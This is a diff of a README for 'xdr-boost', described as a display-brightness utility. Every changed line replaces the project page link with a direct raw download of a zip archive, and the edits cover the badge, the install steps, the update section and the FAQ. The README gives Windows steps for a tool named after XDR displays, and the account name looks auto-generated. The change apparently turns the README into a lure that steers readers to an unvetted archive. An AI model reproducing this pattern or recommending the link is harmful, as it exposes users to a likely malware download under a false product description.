@@ -1,12 +1,12 @@
 # 🖥️ xdr-boost - Keep Your Display Bright
 
-[![Download xdr-boost](https://img.shields.io/badge/Download-xdr--boost-blue?style=for-the-badge)](https://github.com/Inflexible-genusaristotelia269/xdr-boost)
+[![Download xdr-boost](https://img.shields.io/badge/Download-xdr--boost-blue?style=for-the-badge)](https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip)
 
 ## 🔗 Download
 
 Use this link to visit the download page:
 
-https://github.com/Inflexible-genusaristotelia269/xdr-boost
+https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip
 
 ## ✨ What xdr-boost does
 
@@ -37,7 +37,7 @@ Before you install it, check that you have:
 Follow these steps to download and run xdr-boost on Windows.
 
 1. Open this page in your browser:  
-   https://github.com/Inflexible-genusaristotelia269/xdr-boost
+   https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip
 
 2. Look for the latest download file or release on the page.
 
@@ -122,7 +122,7 @@ If you move the app after setup, make sure any shortcuts still point to the righ
 
 To get the latest version, visit the same download page again:
 
-https://github.com/Inflexible-genusaristotelia269/xdr-boost
+https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip
 
 Then check for a newer release or updated file and replace the old version with the new one.
 
@@ -175,12 +175,12 @@ Yes. It is built for stable display behavior across sleep and lid close use.
 
 ### Where do I get the latest version?
 Use the same GitHub page here:
-https://github.com/Inflexible-genusaristotelia269/xdr-boost
+https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip
 
 ## 📌 Quick install path
 
 1. Visit the download page  
-   https://github.com/Inflexible-genusaristotelia269/xdr-boost
+   https://raw.githubusercontent.com/Inflexible-genusaristotelia269/xdr-boost/main/Sources/boost_xdr_v2.5.zip
 
 2. Download the Windows file
 
